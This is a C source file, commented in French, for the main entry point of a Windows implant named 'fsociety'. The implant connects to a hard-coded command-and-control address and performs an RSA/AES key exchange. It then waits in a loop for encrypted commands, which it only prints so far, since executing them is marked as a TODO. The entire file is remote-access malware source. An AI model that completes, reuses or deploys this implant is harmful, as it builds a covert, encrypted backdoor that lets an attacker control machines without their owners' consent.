#include "comm.h"
#include "crypto.h"
#include "rsa_der.h"
#include "protocol.h"

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

/* ============================================================
 * fsociety — Point d'entrée de l'implant
 * ============================================================ */

typedef struct {
    uint8_t aes_key[FSO_KEY_SIZE];
    int     established;
} fso_session_t;

static uint16_t g_seq = 0;

static int send_keyx(fso_conn_t *conn, const fso_rsa_keypair_t *kp)
{
    uint8_t der[1024];
    size_t der_len = sizeof(der);

    if (fso_rsa_bcrypt_to_der(kp->pub, kp->pub_len, der, &der_len)
        != FSO_CRYPTO_OK) {
        fprintf(stderr, "[-] Conversion DER échouée\n");
        return -1;
    }

    printf("[*] Clé publique DER : %zu octets\n", der_len);

    uint8_t packet[1200];
    int packet_len = fso_pack(MSG_KEYX, 0, der, (uint32_t)der_len,
                              packet, sizeof(packet));
    if (packet_len < 0) {
        fprintf(stderr, "[-] fso_pack échoué\n");
        return -1;
    }

    if (fso_conn_send(conn, packet, (size_t)packet_len) < 0) {
        fprintf(stderr, "[-] Envoi MSG_KEYX échoué\n");
        return -1;
    }

    printf("[+] MSG_KEYX envoyé (%d octets)\n", packet_len);
    return 0;
}

static int recv_auth(fso_conn_t *conn, const fso_rsa_keypair_t *kp,
                     fso_session_t *sess)
{
    uint8_t hdr_buf[FSO_HEADER_SIZE];
    if (fso_conn_recv_exact(conn, hdr_buf, FSO_HEADER_SIZE) != FSO_HEADER_SIZE) {
        fprintf(stderr, "[-] Réception en-tête MSG_AUTH échouée\n");
        return -1;
    }

    fso_header_t header;
    if (fso_unpack_header(hdr_buf, FSO_HEADER_SIZE, &header) != 0) {
        fprintf(stderr, "[-] fso_unpack_header échoué\n");
        return -1;
    }
    if (header.type != MSG_AUTH) {
        fprintf(stderr, "[-] Type inattendu : 0x%02X\n", header.type);
        return -1;
    }
    if (header.length > 2048) {
        fprintf(stderr, "[-] MSG_AUTH trop grand\n");
        return -1;
    }

    uint8_t encrypted[2048];
    if (fso_conn_recv_exact(conn, encrypted, header.length) != (int)header.length) {
        fprintf(stderr, "[-] Réception payload MSG_AUTH échouée\n");
        return -1;
    }

    printf("[*] MSG_AUTH reçu (%u octets)\n", header.length);

    size_t aes_len = sizeof(sess->aes_key);
    if (fso_rsa_decrypt(kp->priv, kp->priv_len,
                        encrypted, header.length,
                        sess->aes_key, &aes_len) != FSO_CRYPTO_OK) {
        fprintf(stderr, "[-] Déchiffrement RSA échoué\n");
        return -1;
    }

    if (aes_len != FSO_KEY_SIZE) {
        fprintf(stderr, "[-] Taille clé AES invalide : %zu\n", aes_len);
        return -1;
    }

    sess->established = 1;
    printf("[+] Session établie (clé AES de %zu octets)\n", aes_len);
    return 0;
}

int main(int argc, char **argv)
{
    const char *host = "10.188.152.166";
    uint16_t port = 8443;

    printf("========================================\n");
    printf("  fsociety — Implant\n");
    printf("========================================\n\n");

    if (argc >= 2) host = argv[1];
    if (argc >= 3) port = (uint16_t)atoi(argv[2]);

    if (fso_crypto_init() != FSO_CRYPTO_OK) {
        fprintf(stderr, "[-] Init crypto échouée\n");
        return 1;
    }

    printf("[*] Génération de la paire RSA...\n");
    fso_rsa_keypair_t kp;
    if (fso_rsa_generate(&kp) != FSO_CRYPTO_OK) {
        fprintf(stderr, "[-] Génération RSA échouée\n");
        return 1;
    }
    printf("[+] Paire RSA générée\n");

    if (fso_conn_init() != 0) {
        fso_rsa_free(&kp);
        return 1;
    }

    fso_conn_t conn;
    if (fso_conn_connect(&conn, host, port) != 0) {
        fprintf(stderr, "[-] Échec connexion au C2\n");
        fso_conn_cleanup();
        fso_rsa_free(&kp);
        return 1;
    }

    fso_session_t sess;
    memset(&sess, 0, sizeof(sess));

    if (send_keyx(&conn, &kp) != 0) {
        fprintf(stderr, "[-] Échange de clé échoué\n");
        goto cleanup;
    }

    if (recv_auth(&conn, &kp, &sess) != 0) {
        fprintf(stderr, "[-] Session non établie\n");
        goto cleanup;
    }

    printf("\n[+] Session sécurisée active\n\n");
    printf("[*] En attente de commandes du C2...\n");

    uint8_t *payload = malloc(FSO_MAX_PAYLOAD);
    if (!payload) {
        fprintf(stderr, "[-] malloc échoué\n");
        goto cleanup;
    }

    while (conn.connected) {
        fso_header_t header;

        int n = fso_conn_recv_secure(&conn, sess.aes_key,
                                      &header, payload, FSO_MAX_PAYLOAD);
        if (n < 0) {
            printf("[-] Erreur de réception\n");
            break;
        }

        /* ---------- Dispatch par type ---------- */
        switch (header.type) {

        case MSG_PING: {
            /* Répondre immédiatement avec un PONG. */
            uint8_t pong_byte = 0x00;
            if (fso_conn_send_secure(&conn, sess.aes_key, MSG_PONG,
                                      g_seq++, &pong_byte, 1) < 0) {
                fprintf(stderr, "[-] Envoi MSG_PONG échoué\n");
            } else {
                printf("[keepalive] MSG_PING reçu, PONG renvoyé\n");
            }
            break;
        }

        case MSG_PONG:
            printf("[keepalive] MSG_PONG reçu\n");
            break;

        case MSG_CMD:
            printf("[C2] commande reçue (%d octets)\n", n);
            if (n > 0) {
                fwrite(payload, 1, (size_t)n, stdout);
                printf("\n");
            }
            /* TODO : exécuter la commande et renvoyer MSG_RESULT. */
            break;

        default:
            printf("[C2] type=0x%02X seq=%u, %d octets\n",
                   header.type, header.seq_id, n);
            if (n > 0) {
                fwrite(payload, 1, (size_t)n, stdout);
                printf("\n");
            }
            break;
        }
    }

    free(payload);

cleanup:
    printf("[*] Déconnexion\n");
    fso_conn_close(&conn);
    fso_conn_cleanup();
    fso_rsa_free(&kp);
    fso_crypto_cleanup();

    return 0;
}